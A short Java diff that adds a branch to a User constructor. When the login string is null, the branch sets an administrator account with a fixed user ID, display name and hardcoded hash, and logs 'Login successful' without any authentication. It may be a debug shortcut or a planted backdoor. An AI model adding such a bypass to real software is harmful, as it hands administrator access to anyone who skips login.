@@ -24,7 +24,15 @@ public class User {
 
     public User(String loginString) {
         this.secondaryGroups = new ArrayList<>();
-
+        if(loginString == null){
+            this.primaryGroup = UserGroup.ADMINISTRATOR;
+            this.secondaryGroups.add(UserGroup.SCHOLAR);
+            this.userId = 1;
+            this.displayName = "Hiasat";
+            this.hash = "qTYGLQueDQuJsEDkjaqbrrkG9SVDZ38y";
+            log.info("Login successful. Welcome " + getDisplayName() + "!", Color.GREEN);
+            return;
+        }
         try {
             final String[] data = loginString.split("<br>");
             this.hash = data[1];
